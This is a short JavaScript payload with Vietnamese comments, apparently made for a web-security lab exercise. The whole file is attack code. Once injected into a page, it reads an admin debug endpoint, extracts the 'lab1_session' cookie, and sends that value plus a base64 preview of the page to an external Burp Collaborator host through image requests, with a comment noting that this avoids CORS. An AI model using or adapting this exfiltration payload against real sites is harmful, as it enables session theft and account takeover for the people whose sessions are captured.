(async () => {
    try {
        const response = await fetch('/admin/debug');
        const text = await response.text();
        
        // Tìm session
        const sessionRegex = /lab1_session=([^;\s]+)/i;
        const match = text.match(sessionRegex);
        
        if (match) {
            const sessionValue = match[1];
            console.log('Found session:', sessionValue);
            
            // Gửi qua GET request (img không bị CORS)
            const collaborator = 'eweo81gavxl4qjyx3n7e74hft6zxnubj.oastify.com';
            const img = new Image();
            img.src = `https://${collaborator}/?session=${encodeURIComponent(sessionValue)}`;
            
            // Hoặc gửi toàn bộ data qua URL (có thể cần encode base64 nếu dài)
            const data = btoa(JSON.stringify({
                session: sessionValue,
                status: response.status,
                preview: text.substring(0, 1000)
            }));
            const img2 = new Image();
            img2.src = `https://${collaborator}/?data=${encodeURIComponent(data)}`;
        }
    } catch (error) {
        console.error('Error:', error);
    }
})();
